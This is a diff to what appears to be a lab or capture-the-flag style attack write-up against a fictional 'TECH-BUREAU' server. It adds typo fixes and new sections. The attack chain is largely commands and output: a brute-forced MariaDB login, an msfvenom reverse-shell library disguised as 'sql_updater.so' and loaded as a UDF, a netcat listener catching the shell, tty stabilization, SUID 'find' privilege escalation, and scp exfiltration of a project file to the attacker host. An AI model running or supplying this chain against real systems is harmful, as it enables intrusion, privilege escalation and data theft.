@@ -67,7 +67,8 @@ Hydra sstarting at 2026-03-13 15:05:27
 Hydra finished at 2026-03-13 15:05:27
 </code></pre>
 
-We have a hit. With the credentials secure its time to work on that CVE, prepare a reverse shell file we shall send and executed within the MariaDB granting a shell.<br> 
+We have a hit. With the credentials secure its time to work on that CVE,<br>
+prepare a reverse shell file we will send and execute within the MariaDB, granting access.<br> 
 
 ## 02.MetaSploit Venom
 
@@ -83,15 +84,15 @@ Final size of elf-so file: 476 bytes
 Saved as: <span class="red"><strong>sql_updater.so</strong></span>
 </code></pre>
 
-We need to gaina shell on teh server, so we generate this nifty little file with **Venom**.<br>
+We need to gaina shell on the BUREAU server, so we generate this nifty little file with **Venom**.<br>
 Making sure to specify our attack box as the host and a distinct port that we shall be listening on using **netcat**.<br>
-The payload is named inconspicuously as *sql_updater.so*, doesnt sound suspicious now does it.<br>
+The payload is named inconspicuously as *sql_updater.so*, doesn't sound suspicious now does it.<br>
 
 ## 03.Enter the SQL
 
 <pre data-label="SQL Login"><code>
 <span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.02$ mysql -h TECH-BUREAU -u admin -p
-Enter password: span class="orange"><strong>password</strong></span>
+Enter password:<span class="orange"><strong>password</strong></span>
 
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MariaDB connection id is 52
@@ -132,13 +133,97 @@ MariaDB [(none)]> CREATE FUNCTION <span class="orange"><strong>sys_exec</strong>
 ERROR 2013 (HY000): Lost connection to server during query  
 </code></pre>
 
-Here we envoke a function that teh database would read, but because of teh missconfiguration in the settings and an unpached service it is actualy executing the file we have provided. The MariaDB connection hangs and we gain a shell on our atack box netcat listener.
+Here we envoke a function that the database would read, but because of a missconfiguration in the settings<br>
+and an unpached service it is actualy executing the file we have provided.<br>
+The MariaDB connection hangs and we gain a shell on our atack box's netcat listener.<br>
 
 <pre data-label="shell recieved"><code>
 <span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.02$ nc -lvnp 4444
 Listening on 0.0.0.0 4444
 Connection received on 192.168.1.10 55712
 </code></pre>
+
+## 06.STABILIZING THE SHELL
+
+<pre data-label="shell stabelized"><code>
+<span class="orange">square@AT4K-3XPR3S:</strong></span>~/BUREAU.02$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 192.168.1.10 55712
+<span class="orange">python3 -c "import pty;pty.spawn('/bin/bash')"</strong></span>
+mysql@TECH-BUREAU-UBUNTU-24:/var/lib/mysql$ <span class="orange">export TERM=xterm</strong></span>
+export TERM=xterm ## <span class="orange">PRESS CTRL-Z</strong></span> ##
+mysql@TECH-BUREAU-UBUNTU-24:/var/lib/mysql$ ^Z
+[1]+  Stopped                 nc -lvnp 4444
+square@AT4K-3XPR3S:~/BUREAU.02$ <span class="orange">stty raw -echo; fg</strong></span>
+nc -lvnp 4444
+             <span class="orange">whoami</strong></span>
+mysql
+<span class="orange">mysql@TECH-BUREAU-UBUNTU-24:</strong></span>/var/lib/mysql$ 
+</code></pre>
+
+## 07.CD IN TO PROJECT
+
+mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer$ cd PROJECT.5527/
+bash: cd: PROJECT.5527/: Permission denied
+mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer$ cd TOOLS
+mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ ls
+'=1000'   engineer_find
+mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ 
+
+
+FINDING THE SUID
+
+mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ ls -l
+total 200
+-rwsr-xr-x 1 lead_engineer lead_engineer 204264 Mar 12 10:39  engineer_find
+
+PRIVILEGE ESCALATION
+
+mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ ./engineer_find . -exec /bin/bash -p \; -quit
+bash-5.2$ whoami
+lead_engineer
+bash-5.2$ 
+
+
+CAT DATA
+
+bash-5.2$ cd PROJECT.5527/
+bash-5.2$ ls
+Frame_specs.txt  Valve_specs.txt
+bash-5.2$ cat Valve_specs.txt 
+T1s shall use poppet valves!
+(Instead of the normal spool-shaped, sliding valve system.)
+As a cam shaft rotates, either the intake valve or the exhaust valve is opened.
+Steam is admitted to the cylinder and the valve is closed.
+The process repeats for the exhaust.
+A dedicated exhaust valve is opened, allowing steam to escape the cylinder.
+
+Result: dramatically improved steam-usage efficiency.
+bash-5.2$ 
+
+
+SCP DATA
+
+
+bash-5.2$ scp Valve_specs.txt square@192.168.1.16:~/BUREAU.02/
+The authenticity of host '192.168.1.16 (192.168.1.16)' can't be established.
+ED25519 key fingerprint is SHA256:4km0uXkh784O7Fc9TGf4Yc8rC2+2ZmvxXSkYLMD8w/Y.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Could not create directory '/nonexistent/.ssh' (No such file or directory).
+Failed to add the host to the list of known hosts (/nonexistent/.ssh/known_hosts).
+square@192.168.1.16's password: 
+Valve_specs.txt                               100%  396    37.5KB/s   00:00   
+
+EXIT
+
+exit
+mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ exit
+exit
+
+
+
+
 
 # TECH-BUREAU ROLLING OUT
 
